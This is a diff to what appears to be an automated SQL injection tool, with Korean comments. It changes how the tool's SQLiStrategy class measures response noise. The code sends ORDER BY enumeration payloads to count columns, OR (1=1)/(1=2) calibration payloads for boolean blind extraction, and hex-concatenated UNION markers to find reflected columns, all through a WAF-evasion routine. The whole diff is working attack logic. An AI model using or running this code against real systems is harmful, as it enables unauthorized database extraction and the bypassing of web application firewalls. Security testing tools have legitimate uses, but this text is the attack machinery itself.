                        injection_prefix: str, comment: str, waf_hits: list, waf_evasions: list,
-                       page_noise: int = 0, stateful: bool = False) -> None:
+                       stateful: bool = False) -> None:
         baseline_text = visible_text(baseline_body)
 
         # 본문 길이 차이(len)만 보면, 이 필드처럼 본문이 숨겨져 있고(evidence_kind='status')
         # 상태코드만 바뀌는 blind 사이트에서는 컬럼 수 경계를 절대 못 찾는다 — 상태코드 변화도
         # 같이 추적해서, 둘 중 하나라도 baseline에서 벗어나면 그 지점을 컬럼 수 경계로 본다.
-        # baseline과의 비교는 raw 길이 대신 visible text diff_score를 쓴다.
-        #
-        # page_noise(페이지 요청별 흔들림)는 run()의 멱등성 프로브가 엔드포인트당 한 번 재서
-        # 넘겨준 값이다 — 여기서 또 측정하지 않고 그대로 ORDER BY 컬럼 수 판별의 동적 임계값에
-        # 쓴다. 바닥값을 5가 아니라 1로 낮추는 건 _probe_hidden_syntax_break와 같은 이유(짧은
-        # 응답에선 진짜 경계 diff가 5 미만일 수 있음).
-        noise_threshold = max(page_noise * 2, 1)
-        print(f"    [Noise] page_noise={page_noise} → threshold={noise_threshold} (ORDER BY 컬럼 수 판별용)")
-
-        order_results = {}
-        order_payloads = {}
+        # 컬럼 수를 넘기면 에러로 응답이 질적으로 달라지는데, 유효한 ORDER BY끼리는 행 재정렬 정도의
+        # 흔들림만 보인다. 그래서 절대 노이즈 대신, 유효 응답(ORDER BY 1)을 기준으로 그 흔들림보다
+        # 확실히 벗어나는 지점을 경계로 본다(_separable). 흔들림 바닥은 ORDER BY 1↔2 차이로 잡는다.
+        order_rows = {}  # n -> (status, text|None, used_payload)
         for n in range(1, self.MAX_UNION_COLS + 1):
             status, body, _, used_payload, _ = self._send_evading(
                 surface, base_fields, f"{injection_prefix} ORDER BY {n} {comment}", f'enum(ORDER BY {n})', waf_hits, waf_evasions,
             )
-            diff = diff_score(baseline_text, visible_text(body)) if status is not None else 0
-            order_results[n] = (status, diff)
-            order_payloads[n] = used_payload
+            order_rows[n] = (status, visible_text(body) if status is not None else None, used_payload)
             if status is None and n == 1:
                 # ORDER BY 1이 우회 7종을 다 쓰고도 완전히 막혔다면, 2~10도 숫자만 다를 뿐
                 # 완전히 같은 모양(공백+키워드)의 페이로드라 막히는 이유가 똑같다 — 컬럼 수와
@@ -1203,22 +1103,30 @@ class SQLiStrategy(BaseStrategy):
             print(f"    [Enum] {vuln_entry['type']}로 탐지됨 — 에러 메시지가 화면에 안 뜨는 blind 유형이라 "
                   f"extractvalue 계열 시도는 스킵")
 
+        # 유효 기준(ORDER BY 1)과 재정렬 흔들림 바닥(ORDER BY 1↔2 차이)을 잡는다. 둘 다 유효(= baseline과
+        # 같은 상태코드, 본문 있음)일 때만 흔들림으로 인정하고, 아니면 0(에러 경계는 1자 차이로도 신호).
+        ref_text = order_rows.get(1, (None, None, None))[1]
+        ob2 = order_rows.get(2, (None, None, None))
+        order_jitter = (diff_score(ref_text, ob2[1])
+                        if ref_text is not None and ob2[1] is not None
+                        and order_rows[1][0] == baseline_status and ob2[0] == baseline_status
+                        else 0)
+
         union_col = None
         boundary_payload = None   # 컬럼 수가 깨지는 경계 지점의 실제 페이로드 — 사람이 그대로 붙여넣어 재현 가능
         prev_status_ok = True   # 직전 n까지는 baseline과 같은 상태코드였는지
-        for n in sorted(order_results):
-            cur_status, cur_diff = order_results[n]
+        for n in sorted(order_rows):
+            cur_status, cur_text, used_payload = order_rows[n]
             status_broke = cur_status is not None and cur_status != baseline_status and prev_status_ok
-            # >=(이상) — diff가 정확히 threshold와 같은 경계 케이스도 신호로 잡는다. 짧은 응답
-            # 페이지에서 noise가 0이면 threshold가 바닥값(1)에 고정되는데, 실제 컬럼 수 경계의
-            # diff가 하필 그 값과 같게 나올 수 있다.
-            diff_broke   = cur_diff >= noise_threshold
+            # 본문 경계 — 유효 기준(ORDER BY 1)에서 재정렬 흔들림 이상으로 벗어나면 에러로 본다.
+            diff_broke = (ref_text is not None and cur_text is not None
+                          and self._separable(diff_score(ref_text, cur_text), order_jitter))
             if status_broke or diff_broke:
                 union_col = n - 1 if n > 1 else None
-                boundary_payload = order_payloads[n]
+                boundary_payload = used_payload
                 break
             prev_status_ok = cur_status is None or cur_status == baseline_status
-        print(f"    [Enum] order_results={order_results} → col_count={union_col}")
+        print(f"    [Enum] ORDER BY 재정렬 흔들림={order_jitter} → col_count={union_col}")
 
         db_name_extracted = next(iter(extract_found.values()), None)
 
@@ -1266,7 +1174,7 @@ class SQLiStrategy(BaseStrategy):
             # 브랜치로 시도하고, 성공한 브랜치를 _go_union_extract가 detected_db에 기록한다.
             if vuln_entry.get('detected_db') in (None, 'Unknown'):
                 self._resolve_dialect_for_union(surface, base_fields, injection_prefix, comment,
-                                                 vuln_entry, waf_hits, waf_evasions, page_noise)
+                                                 vuln_entry, waf_hits, waf_evasions)
             attack_vectors['UNION'] = {'possible': True, 'columns': union_col, 'order_by_payload': boundary_payload}
             vuln_entry['attack_vectors'] = attack_vectors
             self._go_union_reflect(surface, base_fields, union_col, comment, vuln_entry,
@@ -1296,7 +1204,7 @@ class SQLiStrategy(BaseStrategy):
                 # 위험이 있어 detected_db를 그대로 넘긴다.
                 blind_db_name, blind_dialect = self._blind_extract_boolean(
                     surface, base_fields, injection_prefix, comment, None, waf_hits, waf_evasions,
-                    known_db=vuln_entry.get('detected_db'), page_noise=page_noise,
+                    known_db=vuln_entry.get('detected_db'),
                 )
                 if blind_dialect:
                     vuln_entry['detected_db'] = blind_dialect
@@ -1529,22 +1437,26 @@ class SQLiStrategy(BaseStrategy):
         return None
 
     def _resolve_dialect_for_union(self, surface, base_fields, injection_prefix: str, comment: str,
-                                    vuln_entry: dict, waf_hits: list, waf_evasions: list,
-                                    page_noise: int) -> None:
+                                    vuln_entry: dict, waf_hits: list, waf_evasions: list) -> None:
         """UNION 추출 직전에 방언을 확정해 vuln_entry['detected_db']에 채운다. _blind_extract_boolean과
-        똑같이 OR (1=1)/(1=2)로 기준 텍스트를 잡아 content 오라클이 성립할 때만(캘리브레이션 diff ≥ 노이즈
-        문턱) _resolve_dialect로 판별하고, 아니면 조용히 넘어간다(UNION은 기본 브랜치로 시도 → 성공 브랜치를
-        _go_union_extract가 기록). blind로 넘어가는 경우 _resolve_dialect 캐시를 그대로 재사용한다."""
+        똑같이 OR (1=1)/(1=2)로 기준 텍스트를 잡고 참을 한 번 더 보내 같은조건 흔들림(jitter)을 재,
+        참↔거짓 간격이 그 흔들림보다 확실히 클 때만(_separable) _resolve_dialect로 판별하고, 아니면 조용히
+        넘어간다(UNION은 기본 브랜치로 시도 → 성공 브랜치를 _go_union_extract가 기록). blind로 넘어가는
+        경우 _resolve_dialect 캐시를 그대로 재사용한다."""
         t_status, t_body, _, _, _ = self._send_evading(
             surface, base_fields, f"{injection_prefix} OR (1=1) LIMIT 1 {comment} ", 'dialect(calib-true)', waf_hits, waf_evasions,
+        )
+        t2_status, t2_body, _, _, _ = self._send_evading(
+            surface, base_fields, f"{injection_prefix} OR (1=1) LIMIT 1 {comment} ", 'dialect(calib-true2)', waf_hits, waf_evasions,
         )
         f_status, f_body, _, _, _ = self._send_evading(
             surface, base_fields, f"{injection_prefix} OR (1=2) LIMIT 1 {comment} ", 'dialect(calib-false)', waf_hits, waf_evasions,
         )
-        if t_status is None or f_status is None:
+        if t_status is None or t2_status is None or f_status is None:
             return
         ref_true_text, ref_false_text = visible_text(t_body), visible_text(f_body)
-        if diff_score(ref_true_text, ref_false_text) < max(page_noise * 2, 1):
+        jitter = diff_score(ref_true_text, visible_text(t2_body))
+        if not self._separable(diff_score(ref_true_text, ref_false_text), jitter):
             return  # content 오라클 미성립 — UNION 기본 브랜치로 두고 방언 판별 스킵
         dialect = self._resolve_dialect(surface, base_fields, injection_prefix, comment,
                                          ref_true_text, ref_false_text, waf_hits, waf_evasions,
@@ -1554,7 +1466,7 @@ class SQLiStrategy(BaseStrategy):
 
     def _blind_extract_boolean(self, surface, base_fields, injection_prefix: str, comment: str, expr: str | None,
                                 waf_hits: list, waf_evasions: list,
-                                known_db: str | None = None, page_noise: int = 0) -> tuple[str | None, str | None]:
+                                known_db: str | None = None) -> tuple[str | None, str | None]:
         """참/거짓 오라클 + 이진 탐색으로 expr 값을 문자 단위로 뽑아낸다.
 
         expr=None이면 현재 DB명을 뽑으라는 뜻으로 해석한다 — 캘리브레이션 직후 DB 방언
@@ -1567,28 +1479,28 @@ class SQLiStrategy(BaseStrategy):
 
         반환값: (추출된 문자열 또는 None, 판별된 DB 방언 이름 또는 None).
         """
-        # page_noise(페이지 요청별 흔들림)는 run()의 멱등성 프로브가 엔드포인트당 한 번 재서
-        # 넘겨준 값이라 여기서 또 측정하지 않는다. 바닥값을 5가 아니라 1로 두는 건 ORDER BY
-        # 판별과 같은 이유 — 짧은 응답에선 진짜 참/거짓 신호도 diff가 5 미만일 수 있어서다.
-        # (실패 판정 calib_diff < noise_threshold는 경계값을 통과시키는 방향이라 그대로 둔다.)
-        noise_threshold = max(page_noise * 2, 1)
-
-        # 캘리브레이션 — 원본값을 몰라도, 항상 참/거짓인 상수 조건으로 기준 텍스트를 잡는다.
+        # 캘리브레이션 — 항상 참/거짓인 상수 조건으로 기준 텍스트를 잡고, 참을 한 번 더 보내 같은
+        # 조건끼리의 흔들림(jitter)을 잰다. 참↔거짓 간격이 그 흔들림보다 확실히 커야(_separable)
+        # content 오라클을 신뢰한다 — 절대 노이즈 상수 대신 같은 조건 응답으로 바닥을 in-context로 잡는다.
         t_status, t_body, _, _, _ = self._send_evading(
             surface, base_fields, f"{injection_prefix} OR (1=1) LIMIT 1 {comment} ", 'blind(calib-true)', waf_hits, waf_evasions,
+        )
+        t2_status, t2_body, _, _, _ = self._send_evading(
+            surface, base_fields, f"{injection_prefix} OR (1=1) LIMIT 1 {comment} ", 'blind(calib-true2)', waf_hits, waf_evasions,
         )
         f_status, f_body, _, _, _ = self._send_evading(
             surface, base_fields, f"{injection_prefix} OR (1=2) LIMIT 1 {comment} ", 'blind(calib-false)', waf_hits, waf_evasions,
         )
-        if t_status is None or f_status is None:
+        if t_status is None or t2_status is None or f_status is None:
             return None, None
         ref_true_text, ref_false_text = visible_text(t_body), visible_text(f_body)
+        jitter = diff_score(ref_true_text, visible_text(t2_body))
         calib_diff = diff_score(ref_true_text, ref_false_text)
-        if calib_diff < noise_threshold:
-            print(f"    [Blind] 캘리브레이션 실패 — 참/거짓 응답 차이 {calib_diff}자가 페이지 노이즈 문턱 "
-                  f"{noise_threshold}자보다 작아 추출 신뢰 불가")
+        if not self._separable(calib_diff, jitter):
+            print(f"    [Blind] 캘리브레이션 실패 — 참↔거짓 간격 {calib_diff}자가 같은조건 흔들림 {jitter}자를 "
+                  f"충분히 못 넘어 추출 신뢰 불가")
             return None, None
-        print(f"    [Blind] 캘리브레이션: diff={calib_diff}자 (noise={page_noise}, threshold={noise_threshold})")
+        print(f"    [Blind] 캘리브레이션: 참↔거짓 간격={calib_diff}자, 같은조건 흔들림={jitter}자")
 
         dialect = self._resolve_dialect(surface, base_fields, injection_prefix, comment,
                                          ref_true_text, ref_false_text, waf_hits, waf_evasions,
@@ -1730,7 +1642,7 @@ class SQLiStrategy(BaseStrategy):
                            injection_prefix: str, waf_hits: list, waf_evasions: list) -> None:
         """각 컬럼 위치에 마커를 넣어 어느 컬럼이 화면에 반사되는지 찾는다.
 
-        마커를 리터럴 문자열(sqli7e7esqli)로 그냥 박으면, 입력받은 쿼리 원문을 디버깅용으로 그대로
+        마커를 리터럴 문자열로 그냥 박으면, 입력받은 쿼리 원문을 디버깅용으로 그대로
         echo하는 사이트에서는 실제로 어느 컬럼이 반사되는지와 무관하게 페이로드에 그 글자가 들어있다는
         이유로 무조건 매치되는 오탐이 생긴다. _go_union_extract가 0x7e7e 같은 hex 리터럴을 쓰는 것과 같은
         이유로, 여기서도 CONCAT(hex, hex)로 쪼개 넣는다 — 실행 전 원문에는 마커가 없고, 실제로 SELECT돼
